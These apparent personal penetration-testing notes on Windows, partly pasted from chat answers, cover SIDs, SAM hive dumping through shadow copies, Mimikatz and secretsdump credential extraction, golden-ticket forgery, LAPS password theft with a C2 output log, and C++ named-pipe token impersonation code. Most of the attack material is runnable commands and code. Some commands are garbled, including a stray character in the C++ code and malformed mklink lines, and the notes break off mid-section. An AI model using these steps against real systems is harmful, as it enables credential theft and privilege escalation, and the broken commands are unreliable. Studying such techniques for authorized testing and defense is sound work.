
### **Windows SIDs (Security Identifiers):**

- **Security Identifiers (SIDs)** are unique strings used in Windows to identify user, group, and computer accounts. Each account or group has a unique SID issued by an authority (like a domain controller or local machine).

#### **Differentiating Admins, System Accounts, and Users:**

- **Administrators**: SIDs start with `S-1-5-21...-500` (local admin).
- **System Account**: SID is `S-1-5-18`.
- **Users**: Regular users have SIDs like `S-1-5-21...-1001` (or similar, depending on the user).

### **PowerShell Commands for SIDs and Permissions:**

1. **List SIDs for All Users**:
   ```powershell
   Get-WmiObject Win32_UserAccount | Select Name,SID
   ```
   
2. **Find Current User’s SID**:
   ```powershell
   whoami /user
   ```

3. **Check Admin Rights**:
   ```powershell
   whoami /groups | Where-Object { $_ -match 'S-1-5-32-544' }
   ```

4. **PowerView Command to Check Local Admins** (from PowerSploit):
   ```powershell
   Get-NetLocalGroup -GroupName "Administrators"
   ```

5. **PowerUp Command to Check for Privileges**:
   ```powershell
   Invoke-AllChecks
   ```

These tools and commands can help identify and differentiate between system accounts, administrators, and regular users by their SIDs and group memberships.

The Windows Security Account Manager (SAM) database is a critical component in the Windows operating system, responsible for storing user credentials, including hashed versions of user passwords. Here's an overview of what the SAM database is, how it's structured, and the methods that can be used to extract it.

### **Finding SIDs for All Accounts on a Machine:**

1. **Using PowerShell:**
   ```powershell
   Get-WmiObject Win32_UserAccount | Select Name, SID
   ```
   - This command retrieves the names and SIDs of all user accounts on the local machine.

2. **Using Command Prompt:**
   ```cmd
   wmic useraccount get name,sid
   ```

### **Finding SIDs for All Accounts in a Domain:**

1. **Using PowerShell:**
   ```powershell
   Get-ADUser -Filter * -Property SID | Select Name, SID
   ```
   - This command requires the Active Directory module and retrieves the SIDs of all user accounts in a domain.

2. **Using Command Prompt:**
   - You can use tools like `dsquery` or `net user /domain` to list users, but you would need to script further to extract their SIDs. 

Make sure you have the necessary permissions to execute these commands, especially in a domain environment.

### What is the Windows SAM Database?

1. **Location**: 
   - The SAM database is located at `C:\Windows\System32\config\SAM` on most Windows systems.
   - It is part of the Windows Registry and is specifically found under the `HKEY_LOCAL_MACHINE\SAM` hive.

2. **Purpose**:
   - It stores hashed passwords and other user credentials for local accounts.
   - It's used by the Local Security Authority (LSA) to authenticate users when they log in.

3. **Structure**:
   - The SAM database stores password hashes using the NTLM (NT LAN Manager) and LM (LAN Manager) hash formats.
   - It also stores information like group membership, user rights, and other security-related settings.

### Why Extract the SAM Database?

- **Password Recovery**: To recover lost or forgotten passwords for local accounts.
- **Forensic Analysis**: To investigate potential security breaches or understand how an attack was carried out.
- **Penetration Testing**: To assess the security posture of a Windows machine by attempting to extract and crack password hashes.

### Methods to Extract the SAM Database

Extracting the SAM database requires elevated privileges, and in some cases, it may involve bypassing or defeating certain security measures. Below are common methods used to extract the SAM database:

#### 1. **Copying the SAM and SYSTEM Files Offline**

- **Overview**: The SAM file itself is encrypted using a system key stored in the `SYSTEM` hive of the Windows Registry. To decrypt the SAM file, both the `SAM` and `SYSTEM` files are needed.
- **Steps**:
  1. Boot the system from an alternative OS (e.g., a Linux live CD) or attach the drive to another machine.
  2. Navigate to `C:\Windows\System32\config`.
  3. Copy the `SAM` and `SYSTEM` files to another location.
  4. Use tools like `samdump2` or `bkhive` with `John the Ripper` or `Hashcat` to extract and crack the hashes.

#### 2. **Using Volume Shadow Copy**

- **Overview**: Windows automatically creates shadow copies of important system files, including the SAM and SYSTEM files.
- **Steps**:
  1. Run the following command in an elevated command prompt to list shadow copies:
     ```bash
     vssadmin list shadows
     ```
  2. Use a tool like `Volume Shadow Copy Service (VSS)` to access the shadow copy and retrieve the `SAM` and `SYSTEM` files.
  3. Once the files are extracted, proceed with hash extraction as in the previous method.

#### 3. **Using Mimikatz**

- **Overview**: `Mimikatz` is a powerful post-exploitation tool often used to extract credentials from Windows systems.
- **Steps**:
  1. Download and run `Mimikatz` with elevated privileges.
  2. Use the following commands to dump password hashes from the SAM database:
     ```bash
     privilege::debug
     lsadump::sam
     ```
  3. The hashes can then be cracked using tools like `Hashcat`.

#### 4. **Using `pth` (Pass-the-Hash) Toolkit**

- **Overview**: The `pth` toolkit is another tool that can be used to dump hashes from the SAM database.
- **Steps**:
  1. Run the toolkit with the following command:
     ```bash
     pth-samdump2 SYSTEM SAM
     ```
  2. The hashes extracted can then be cracked or used for pass-the-hash attacks.

#### 5. **Exploiting Privilege Escalation Vulnerabilities**

- **Overview**: Some exploits target specific vulnerabilities that allow attackers to extract the SAM database or its contents.
- **Example**: Tools like `PsExec` or exploits targeting the LSASS (Local Security Authority Subsystem Service) may allow extraction.

### Cracking the SAM Hashes

Once you've extracted the SAM database, you’ll typically need to crack the NTLM or LM hashes to recover the plain-text passwords. 

## Shadow Copy
### Step 1: Open an Elevated Command Prompt

You’ll need administrative privileges to create a shadow copy. Open a Command Prompt with elevated privileges:

1. Press `Windows + X` and select **Command Prompt (Admin)** or **Windows PowerShell (Admin)**.

### Step 2: Create a Shadow Copy

To create a shadow copy of the entire volume where the SAM file is located (usually the `C:` drive), use the `wmic` command:

```cmd
wmic shadowcopy call create Volume='C:\'
```

This command will create a shadow copy of the `C:` drive. The output will include the ID of the shadow copy created.

### Step 3: Find the Shadow Copy Path

You can list all shadow copies to find the exact path to the one you just created:

```cmd
vssadmin list shadows
```

Look for the **Shadow Copy ID** and **Shadow Copy Volume** in the output. The path will look something like `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\`, where `X` is the shadow copy number.

### Step 4: Copy the SAM and SYSTEM Files from the Shadow Copy

You can now use the `copy` command to retrieve the SAM and SYSTEM files from the shadow copy. Replace `X` with the correct shadow copy number.

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SAM C:\path\to\save\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SYSTEM C:\path\to\save\SYSTEM
```

### Step 5: Analyze the Files

With the SAM and SYSTEM files copied, you can now analyze them using tools like `samdump2`, `mimikatz`, `hashcat`, or `John the Ripper` to extract and crack the password hashes.

- **Cleanup**: After you’ve finished, you can delete the shadow copy to free up space:

  ```cmd
  vssadmin delete shadows /for=C: /oldest
  ```

  Or you can delete a specific shadow copy using its ID:

  ```cmd
  vssadmin delete shadows /Shadow={Shadow Copy ID}
  ```

This process allows you to create a backup of the SAM file without rebooting the system, which is useful for both forensic analysis and penetration testing purposes.

To copy items from a shadow copy volume in PowerShell, you can use the following approach:

```powershell
# List shadow copies
vssadmin list shadows

# Mount a shadow copy (replace X: with an unused drive letter)
cmd.exe //c mklink /d X:\ \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{shadow_copy_id}\

# Copy files from the shadow copy
Copy-Item -Path "X:\path\to\file" -Destination "C:\destination\path" -Recurse

# Unmount the shadow copy
Remove-Item X:\ -Force
```

Replace `{shadow_copy_id}` with the actual ID of the shadow copy you want to access. This process mounts the shadow copy, allowing you to copy files from it like any other directory.

Here’s a general outline of the steps:

1. **Create a Shadow Copy**:
   Use `vssadmin` to create a shadow copy:
   ```shell
   vssadmin create shadow /for=C:
   ```

2. **Access the Shadow Copy**:
   Identify the shadow copy ID from `vssadmin list shadows` and mount it:
   ```shell
cmd c:// mklink /d X:\ \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{shadow_copy_id}\
   ```

3. **Copy the Required Files**:
   Copy `SYSTEM`, `SAM`, and `SECURITY` from the shadow copy:
```cmd
Copy-Item "X:\Windows\System32\config\SYSTEM" "C:\path\to\destination\"
Copy-Item "X:\Windows\System32\config\SAM" "C:\path\to\destination\"
Copy-Item "X:\Windows\System32\config\SECURITY" "C:\path\to\destination\"
```

4. **Transfer Files to a Remote Machine**:

5. **Decrypt Hashes**:
   On the remote machine, use `impacket-secretsdump` to extract hashes:
   ```shell
   secretsdump.py -system SYSTEM -sam SAM -security SECURITY LOCAL
   ```

Make sure to replace paths with actual locations and shadow copy IDs.

## LAPS

**Local Administrator Password Solution (LAPS)** is a Microsoft tool designed to manage the local Administrator password on domain-joined computers in a secure manner. It ensures that each computer in a domain has a unique, automatically changing local Administrator password, which is stored securely in Active Directory (AD).

However, if not properly configured or if certain permissions are misconfigured, LAPS can be exploited by an attacker to gain access to these local Administrator passwords. Here’s how this could be done:

### How LAPS Works

1. **Password Storage**:
   - LAPS stores the local Administrator password in a specific attribute (`ms-Mcs-AdmPwd`) of the computer account in AD.
   - The password is encrypted and protected by AD permissions, which are typically restricted to certain groups (e.g., Domain Admins) or specific users.

2. **Permissions**:
   - By default, only users or groups with the appropriate permissions can read the `ms-Mcs-AdmPwd` attribute.
   - If permissions are misconfigured, unauthorized users may gain access to these passwords.

### Exploiting LAPS

To exploit LAPS and retrieve local Administrator passwords, an attacker would generally follow these steps:

#### 1. **Identify LAPS-Managed Machines**

   - **Using LDAP Queries**: An attacker with sufficient access could use LDAP queries to identify machines that have the `ms-Mcs-AdmPwd` attribute set. Tools like `PowerView` can be used to perform such queries:
     ```powershell
     Get-ADComputer -Filter {ms-Mcs-AdmPwd -like "*"} -Property Name,ms-Mcs-AdmPwd
     ```

   - **Using PowerShell**: You can also use a PowerShell command to list computers managed by LAPS:
     ```powershell
     Get-ADComputer -Filter {ms-Mcs-AdmPwdExpirationTime -like "*"} -Property Name,ms-Mcs-AdmPwdExpirationTime
     ```

#### 2. **Check Permissions on `ms-Mcs-AdmPwd` Attribute**

   - **Using PowerShell**: Determine who has read permissions on the `ms-Mcs-AdmPwd` attribute:
     ```powershell
     Get-ACL "AD:\CN=Computers,DC=domain,DC=com" | Format-List
     ```

   - **Review Permissions**: Look for any misconfigured permissions that allow unauthorized users or groups to read the `ms-Mcs-AdmPwd` attribute.

#### 3. **Retrieve the LAPS Password**

   - **Using PowerShell**: If you have sufficient permissions, you can retrieve the LAPS password using the following command:
     ```powershell
     Get-ADComputer -Identity "ComputerName" -Property "ms-Mcs-AdmPwd"
     ```
     This will display the current local Administrator password for the specified computer.

   - **Using AD Tools**: The password can also be retrieved using Active Directory Users and Computers (ADUC) if you have the necessary permissions to view the attribute.

#### 4. **Escalate Privileges Using the LAPS Password**

   - Once the local Administrator password is retrieved, an attacker can use it to gain administrative access to the target machine.
   - This access can be leveraged for further lateral movement within the network, privilege escalation, or persistence.



### Sliver Laps example

```bash
[server] sliver (ALERT_HEATER) > sharplaps /host:192.168.228.5 /user:admin /pass:lab

[*] sharplaps output:

   _____ __                     __    ___    ____  _____
  / ___// /_  ____ __________  / /   /   |  / __ \/ ___/
  \__ \/ __ \/ __ `/ ___/ __ \/ /   / /| | / /_/ /\__ \ 
 ___/ / / / / /_/ / /  / /_/ / /___/ ___ |/ ____/___/ / 
/____/_/ /_/\__,_/_/  / .___/_____/_/  |_/_/    /____/  
                     /_/                             

[+] Using the following credentials
Host: LDAP://192.168.228.5:389
User: admin
Pass: lab

[+] Extracting LAPS password from LDAP
Machine  : APPSRV01$
Password : g49UNA5uGo.4o)

```


## Access Tokens

Windows access tokens are a fundamental part of the Windows security model, representing the security context of a user or process. Understanding how they work is crucial for both legitimate administration and in the context of attacks, such as privilege escalation.

### What Are Windows Access Tokens?

1. **Access Tokens**:
   - An access token is a data structure that contains the security information for a login session. This includes the user's identity, privileges, group memberships, and other security-related information.
   - Every process and thread in Windows has an associated access token that determines its permissions and what resources it can access.

2. **Types of Tokens**:
   - **Primary Token**: Associated with a user’s session and is used by the user’s processes. It’s created when a user logs on.
   - **Impersonation Token**: Allows a process to "impersonate" the security context of another user, typically used in scenarios like client-server communications.

3. **Privileges**:
   - Privileges are specific rights that a user or process can have, such as shutting down the system, managing auditing, or bypassing file permissions.
   - Some privileges are sensitive and can lead to privilege escalation if misused.

### Elevating Privileges Using Access Tokens

Attackers can use various techniques to elevate their privileges by manipulating access tokens. Here are some common methods:

#### 1. **Token Impersonation**

Impersonation allows a process to take on the security context of another user, typically a more privileged one. This is particularly useful when an attacker has compromised a low-privilege account but wants to execute actions as a higher-privilege user.

- **Stealing a Token**:
  - **Identify Tokens**: Tools like `Process Explorer` or PowerShell scripts can be used to enumerate running processes and their associated tokens.
  - **Impersonate Token**: An attacker can impersonate the token of a higher-privilege process (like `lsass.exe` or `winlogon.exe`), effectively giving them the same privileges as that process.

  ```powershell
  Invoke-TokenManipulation -Enumerate
  Invoke-TokenManipulation -ImpersonateUser -Username "Administrator"
  ```

- **Tools**:
  - **Mimikatz**: A powerful post-exploitation tool that can manipulate tokens. You can use commands like `privilege::debug` and `token::elevate` to steal tokens and escalate privileges.

  ```cmd
  mimikatz # token::elevate
  ```

#### 2. **Token Duplication (Token Swapping)**

In some cases, an attacker might duplicate an existing token of a privileged process and use it for their own purposes.

- **Process Injection**: An attacker can inject code into a privileged process and then duplicate its token to create a new process under the higher-privilege context.

  ```cmd
  runas /user:Administrator /savecred "cmd.exe"
  ```

- **Example**:
  - An attacker with local administrator privileges can use the `runas` command or a tool like `PsExec` to start a new process with the token of a more privileged account.

#### 3. **Kerberos Golden Ticket Attack**

A Golden Ticket is a forged Kerberos ticket that allows an attacker to authenticate as any user, including Domain Admins, to any service.

- **Process**:
  - Extract the `krbtgt` hash from the domain controller.
  - Use a tool like `Mimikatz` to forge a Golden Ticket.
  - Inject the ticket into a process and impersonate a privileged user.

  ```cmd
  mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:<hash> /ticket:ticket.kirbi
  mimikatz # kerberos::ptt ticket.kirbi
  ```

#### 4. **Token Privilege Escalation Exploit**

Sometimes, an attacker may directly modify the privileges associated with an access token.

- **Privilege Escalation**:
  - Some exploits allow you to directly modify the token's privileges or even create a new token with escalated privileges. This requires deep knowledge of Windows internals and often relies on vulnerabilities.

- **Example**:
  - **UAC Bypass**: User Account Control (UAC) can sometimes be bypassed by manipulating the token associated with a user session, escalating privileges without triggering UAC prompts.

### Defenses Against Token-Based Privilege Escalation

- **Least Privilege**: Ensure users and processes have the minimum necessary privileges to perform their tasks.
- **Token Security**: Regularly monitor and audit token usage. Restrict who can create and manipulate tokens.
- **Harden Sensitive Processes**: Ensure that processes like `lsass.exe` are protected, and limit access to administrative accounts.
- **Patch Management**: Keep systems up to date to protect against known vulnerabilities that allow token manipulation.

### Conclusion

Windows access tokens are integral to the security model of the operating system, governing what a user or process can do. While they are crucial for normal operations, they can also be exploited by attackers to elevate privileges and move laterally within a network. Understanding how tokens work, how they can be manipulated, and how to defend against these techniques is essential for maintaining the security of a Windows environment.

Certainly! Below is a table listing some of the most common Windows privileges along with their descriptions. These privileges determine the specific actions that a user or process can perform on a Windows system.

| Privilege Name                  | Description                                                                                  |
|---------------------------------|----------------------------------------------------------------------------------------------|
| `SeShutdownPrivilege`           | Allows the user to shut down the local system.                                               |
| `SeUndockPrivilege`             | Allows the user to remove the computer from a docking station without logging off.           |
| `SeBackupPrivilege`             | Allows the user to back up files and directories, bypassing file and directory permissions.  |
| `SeRestorePrivilege`            | Allows the user to restore files and directories, bypassing file and directory permissions.  |
| `SeDebugPrivilege`              | Allows the user to debug and adjust the memory of a process owned by another account.        |
| `SeChangeNotifyPrivilege`       | Allows the user to bypass traverse checking. This privilege allows the user to traverse directories without checking permissions. |
| `SeSystemtimePrivilege`         | Allows the user to change the system time.                                                   |
| `SeIncreaseQuotaPrivilege`      | Allows the user to increase the quota assigned to a process.                                 |
| `SeSecurityPrivilege`           | Allows the user to manage auditing and the security log.                                     |
| `SeTakeOwnershipPrivilege`      | Allows the user to take ownership of files or other objects.                                 |
| `SeRemoteShutdownPrivilege`     | Allows the user to shut down a system from a remote location on the network.                 |
| `SeAuditPrivilege`              | Allows the user to generate audit records in the security log.                               |
| `SeCreatePagefilePrivilege`     | Allows the user to create a paging file.                                                     |
| `SeIncreaseBasePriorityPrivilege` | Allows the user to increase the base priority of a process.                                 |
| `SeLoadDriverPrivilege`         | Allows the user to load and unload device drivers.                                           |
| `SeProfileSingleProcessPrivilege` | Allows the user to profile a single process.                                                |
| `SeSystemProfilePrivilege`      | Allows the user to profile system performance.                                               |
| `SeAssignPrimaryTokenPrivilege` | Allows the user to assign a primary token to a process.                                      |
| `SeLockMemoryPrivilege`         | Allows the user to lock pages in memory.                                                     |
| `SeMachineAccountPrivilege`     | Allows the user to create a computer account in Active Directory.                            |
| `SeIncreaseWorkingSetPrivilege` | Allows the user to increase the size of a process's working set.                             |
| `SeManageVolumePrivilege`       | Allows the user to perform tasks like defragmenting and changing the drive letter of volumes. |
| `SeImpersonatePrivilege`        | Allows the user to impersonate another user.                                                 |
| `SeRelabelPrivilege`            | Allows the user to change the integrity level of objects.                                    |
| `SeCreateGlobalPrivilege`       | Allows the user to create global objects.                                                    |
| `SeCreateTokenPrivilege`        | Allows the user to create an access token.                                                   |
| `SeTcbPrivilege`                | Allows the user to act as part of the operating system.                                      |
| `SeUnsolicitedInputPrivilege`   | Deprecated privilege; was used to give the user unsolicited input.                           |
| `SeTimeZonePrivilege`           | Allows the user to change the time zone.                                                     |
| `SeSyncAgentPrivilege`          | Allows the user to use the Directory Replicator service to replicate files.                  |

### Adding Privileges to a User

To add a privilege to a user or group, you can use the `Local Security Policy` (GUI) or `secedit` and `ntrights` (CLI) tools. Below is how to do it using both methods:

#### Method 1: Using Local Security Policy (GUI)

1. **Open Local Security Policy**:
   - Press `Windows + R`, type `secpol.msc`, and press Enter.
   
2. **Navigate to User Rights Assignment**:
   - In the Local Security Policy window, go to `Local Policies` → `User Rights Assignment`.

3. **Add the Privilege**:
   - Find the privilege you want to assign (e.g., "Shut down the system").
   - Double-click the privilege, and then click `Add User or Group`.
   - Enter the name of the user or group and click `OK`.

4. **Apply and Exit**:
   - Click `Apply` and `OK`. The user or group will now have the specified privilege.

#### Method 2: Using `ntrights` (CLI)

The `ntrights` utility is part of the Windows Resource Kit and can be used to assign or remove privileges from the command line.

1. **Download `ntrights.exe`**:
   - Download it from the Windows Resource Kit or extract it from a Windows installation media.

2. **Assign the Privilege**:
   - Open an elevated command prompt.
   - Use the following syntax to assign a privilege:
     ```cmd
     ntrights +r SeShutdownPrivilege -u Username
     ```
   - Replace `SeShutdownPrivilege` with the actual privilege name and `Username` with the name of the user or group.

3. **Remove the Privilege**:
   - To remove a privilege, use:
     ```cmd
     ntrights -r SeShutdownPrivilege -u Username
     ```

#### Method 3: Using `secedit` (CLI)

`secedit` is a more advanced tool that can be used to configure security policies including user rights assignments.

1. **Export the Security Policy**:
    
    - Open an elevated command prompt.
    - Export the current security policy to a file:
```cmd
secedit /export /cfg secpol.cfg
```

2. **Edit the Configuration File**:

- Open `secpol.cfg` in a text editor.
- Find the `[Privilege Rights]` section and add your privilege entry. For example:
 ```ini
 SeShutdownPrivilege = *S-1-5-32-544
```

3. **Apply the Configuration**:

- Reapply the modified security policy:
```cmd
secedit /configure /db secedit.sdb /cfg secpol.cfg /areas USER_RIGHTS
```

This will apply the privilege changes to the user or group specified.

Certainly! Here's how you can use named pipes in C++ to impersonate a client and then print the SID associated with the impersonated token.

### **Overview:**
1. **Create a Named Pipe**: Use `CreateNamedPipeA` to create a named pipe server.
2. **Connect to the Pipe**: Use `ConnectNamedPipe` to wait for a client to connect.
3. **Impersonate the Client**: Use `ImpersonateNamedPipeClient` to impersonate the client's security context.
4. **Open and Query the Token**: Use `OpenThreadToken` to get the impersonated token and retrieve the SID associated with it.

### **Code Example in C++:**

Here is a complete example demonstrating these steps:

```cpp
#include <windows.h>
#include <iostream>
#include <sddl.h> // For converting SID to string

void PrintTokenSID(HANDLE tokenHandle) {
    DWORD length = 0;
    PTOKEN_USER tokenUser = nullptr;

    // Get the size of the buffer needed
    GetTokenInformation(tokenHandle, TokenUser, nullptr, 0, &length);

    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
        tokenUser = (PTOKEN_USER)malloc(length);
        if (tokenUser) {
            if (GetTokenInformation(tokenHandle, TokenUser, tokenUser, length, &length)) {
                // Convert SID to string
                LPSTR sidString = nullptr;
                if (ConvertSidToStringSidA(tokenUser->User.Sid, &sidString)) {
                    std::cout << "SID: " << sidString << std::endl;
                    LocalFree(sidString);
                } else {
                    std::cerr << "Failed to convert SID to string." << std::endl;
                }
            } else {
                std::cerr << "Failed to get token information." << std::endl;
            }
            free(tokenUser);
        } else {
            std::cerr << "Failed to allocate memory for token information." << std::endl;
        }
    } else {
        std::cerr << "Failed to get buffer size for token information." << std::endl;
    }
}

int main() {
    // Create a named pipe
    HANDLE pipe = CreateNamedPipeA(
        R"(\\.\pipe\MyPipe)",  // Pipe name
        PIPE_ACCESS_DUPLEX,    // Read/Write access
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, // Byte-type pipe
        1,                     // Max. instances
        0,                     // Output buffer size (0 for default)
        0,                     // Input buffer size (0 for default)
        0,                     // Client time-out (0 for default)
        NULL                   // Default security attributes
    );
N
    if (pipe == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create named pipe." << std::endl;
        return 1;
    }

    std::cout << "Waiting for client to connect..." << std::endl;
    if (!ConnectNamedPipe(pipe, NULL)) {
        std::cerr << "Failed to connect named pipe." << std::endl;
        CloseHandle(pipe);
        return 1;
    }

    std::cout << "Client connected." << std::endl;

    // Impersonate the client
    if (!ImpersonateNamedPipeClient(pipe)) {
        std::cerr << "Failed to impersonate named pipe client." << std::endl;
        CloseHandle(pipe);
        return 1;
    }

    HANDLE tokenHandle = nullptr;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &tokenHandle)) {
        std::cerr << "Failed to open thread token." << std::endl;
        RevertToSelf();
        CloseHandle(pipe);
        return 1;
    }

    // Print the SID associated with the impersonated token
    PrintTokenSID(tokenHandle);

    // Clean up
    CloseHandle(tokenHandle);
    RevertToSelf();
    CloseHandle(pipe);

    return 0;
}
```

### **Explanation:**

1. **CreateNamedPipeA**:
   - Creates a named pipe with the name `\\.\pipe\MyPipe`.
   - Configures the pipe for duplex communication and specifies byte-type pipe with read and write modes.

2. **ConnectNamedPipe**:
   - Waits for a client to connect to the named pipe.

3. **ImpersonateNamedPipeClient**:
   - Impersonates the client’s security context, which allows you to perform actions as the client.

4. **OpenThreadToken**:
   - Opens the token associated with the current thread, which is now impersonating the client.

5. **PrintTokenSID**:
   - Retrieves and prints the SID associated with the token. It uses `GetTokenInformation` to get the `TOKEN_USER` structure and `ConvertSidToStringSidA` to convert the SID to a readable string format.



Here is a C++ code example demonstrating how to convert an impersonation token to a primary token:

### **C++ Code Example**

```cpp
#include <windows.h>
#include <iostream>

bool ConvertImpersonationTokenToPrimary(HANDLE impersonationToken, HANDLE* primaryToken) {
    HANDLE tempToken = nullptr;
    BOOL result = FALSE;

    // Duplicate the impersonation token to create a primary token
    result = DuplicateTokenEx(
        impersonationToken,              // Handle to the impersonation token
        TOKEN_ALL_ACCESS,                // Desired access rights
        NULL,                            // Security attributes (default)
        SecurityImpersonation,           // Impersonation level
        TokenPrimary,                    // Token type (Primary)
        &tempToken                        // Handle to the new token
    );

    if (!result) {
        std::cerr << "Failed to duplicate token. Error: " << GetLastError() << std::endl;
        return false;
    }

    // Set the output handle to the new primary token
    *primaryToken = tempToken;
    return true;
}

int main() {
    HANDLE impersonationToken = nullptr; // Assume this is obtained from impersonation
    HANDLE primaryToken = nullptr;

    // For demonstration purposes, this example assumes that the impersonation token
    // is already obtained. You should replace the following line with actual code
    // to obtain an impersonation token.
    // HANDLE impersonationToken = ...; 

    if (ConvertImpersonationTokenToPrimary(impersonationToken, &primaryToken)) {
        std::cout << "Successfully converted impersonation token to primary token." << std::endl;

        // Optionally, use the primary token to create a process or perform other actions
        // ...

        // Close the token handle when done
        CloseHandle(primaryToken);
    } else {
        std::cerr << "Failed to convert impersonation token to primary token." << std::endl;
    }

    // Clean up the impersonation token if it was opened in the code
    // CloseHandle(impersonationToken);

    return 0;
}
```


### 1. **CreateNamedPipe**
   - **Function:** `HANDLE CreateNamedPipe(LPCTSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes);`
   - **Purpose:** Creates an instance of a named pipe and returns a handle to the pipe. This function is used for inter-process communication (IPC).

### 2. **ConnectNamedPipe**
   - **Function:** `BOOL ConnectNamedPipe(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped);`
   - **Purpose:** Connects a named pipe client to a server. This function blocks until a client connects or until an error occurs.

### 3. **ImpersonateNamedPipeClient**
   - **Function:** `BOOL ImpersonateNamedPipeClient(HANDLE hNamedPipe);`
   - **Purpose:** Impersonates the security context of a client that is connected to a named pipe.

### 4. **OpenThreadToken**
   - **Function:** `BOOL OpenThreadToken(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle);`
   - **Purpose:** Opens the access token associated with a thread. This token can be used to query or modify the thread's security context.

### 5. **GetCurrentThread**
   - **Function:** `HANDLE GetCurrentThread(void);`
   - **Purpose:** Retrieves a pseudohandle for the calling thread. This handle can be used to identify the thread in various operations.

### 6. **CreateProcessWithTokenW**
   - **Function:** `BOOL CreateProcessWithTokenW(HANDLE hToken, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);`
   - **Purpose:** Creates a new process and its primary thread, with the security token that was passed. This function is used to start a process under a different user's security context.

### 7. **DuplicateTokenEx**
   - **Function:** `BOOL DuplicateTokenEx(HANDLE hExistingToken, DWORD dwDesiredAccess, LPSECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE phNewToken);`
   - **Purpose:** Creates a new access token that duplicates an existing token. This new token can have different levels of access or impersonation.

### 8. **RevertToSelf**
   - **Function:** `BOOL RevertToSelf(void);`
   - **Purpose:** Reverts the security context of the current thread to that of the process. This is often used after a thread has impersonated a client.

### 9. **GetSystemDirectory**
   - **Function:** `UINT GetSystemDirectory(LPTSTR lpBuffer, UINT uSize);`
   - **Purpose:** Retrieves the path of the system directory (e.g., `C:\Windows\System32`).

### 10. **CreateEnvironmentBlock**
   - **Function:** `BOOL CreateEnvironmentBlock(LPVOID *lpEnvironment, HANDLE hToken, BOOL bInherit);`
   - **Purpose:** Creates an environment block for a new process. This block contains environment variables for the user represented by the specified token.

### 11. **GetCurrentProcess**
   - **Function:** `HANDLE GetCurrentProcess(void);`
   - **Purpose:** Retrieves a pseudohandle for the calling process. This handle can be used to identify the process in various operations.

### 12. **OpenProcessToken**
   - **Function:** `BOOL OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);`
   - **Purpose:** Opens the access token associated with a process. This token can be used to query or modify the process's security context.



| **Return Type**  | **Function**               | **Arguments**                                                                                                              |
|------------------|----------------------------|----------------------------------------------------------------------------------------------------------------------------|
| `HANDLE`         | `CreateNamedPipe`          | <ul><li>`LPCTSTR lpName`</li><li>`DWORD dwOpenMode`</li><li>`DWORD dwPipeMode`</li><li>`DWORD nMaxInstances`</li><li>`DWORD nOutBufferSize`</li><li>`DWORD nInBufferSize`</li><li>`DWORD nDefaultTimeOut*`</li><li>`LPSECURITY_ATTRIBUTES lpSecurityAttributes*`</li></ul> |
| `BOOL`           | `ConnectNamedPipe`         | <ul><li>`HANDLE hNamedPipe`</li><li>`LPOVERLAPPED lpOverlapped*`</li></ul>                                                 |
| `BOOL`           | `ImpersonateNamedPipeClient` | <ul><li>`HANDLE hNamedPipe`</li></ul>                                                                                      |
| `BOOL`           | `OpenThreadToken`          | <ul><li>`HANDLE ThreadHandle`</li><li>`DWORD DesiredAccess`</li><li>`BOOL OpenAsSelf`</li><li>`PHANDLE TokenHandle`</li></ul>|
| `HANDLE`         | `GetCurrentThread`         | <ul><li>`void`</li></ul>                                                                                                   |
| `BOOL`           | `CreateProcessWithTokenW`  | <ul><li>`HANDLE hToken`</li><li>`DWORD dwLogonFlags`</li><li>`LPCWSTR lpApplicationName*`</li><li>`LPWSTR lpCommandLine*`</li><li>`DWORD dwCreationFlags`</li><li>`LPVOID lpEnvironment*`</li><li>`LPCWSTR lpCurrentDirectory*`</li><li>`LPSTARTUPINFOW lpStartupInfo`</li><li>`LPPROCESS_INFORMATION lpProcessInformation`</li></ul> |
| `BOOL`           | `DuplicateTokenEx`         | <ul><li>`HANDLE hExistingToken`</li><li>`DWORD dwDesiredAccess`</li><li>`LPSECURITY_ATTRIBUTES lpTokenAttributes*`</li><li>`SECURITY_IMPERSONATION_LEVEL ImpersonationLevel`</li><li>`TOKEN_TYPE TokenType`</li><li>`PHANDLE phNewToken`</li></ul> |
| `BOOL`           | `RevertToSelf`             | <ul><li>`void`</li></ul>                                                                                                   |
| `UINT`           | `GetSystemDirectory`       | <ul><li>`LPTSTR lpBuffer`</li><li>`UINT uSize`</li></ul>                                                                   |
| `BOOL`           | `CreateEnvironmentBlock`   | <ul><li>`LPVOID *lpEnvironment`</li><li>`HANDLE hToken`</li><li>`BOOL bInherit`</li></ul>                                  |
| `HANDLE`         | `GetCurrentProcess`        | <ul><li>`void`</li></ul>                                                                                                   |
| `BOOL`           | `OpenProcessToken`         | <ul><li>`HANDLE ProcessHandle`</li><li>`DWORD DesiredAccess`</li><li>`PHANDLE TokenHandle`</li></ul>                       |





In Windows, you can find the delegation tokens available on the machine using PowerShell by querying the security tokens associated with user sessions. Here's a method that involves using the `Get-Process` and `Get-WmiObject` cmdlets to identify the user sessions and corresponding tokens:

### Method 1: Using `Get-WmiObject` and `Get-Process`

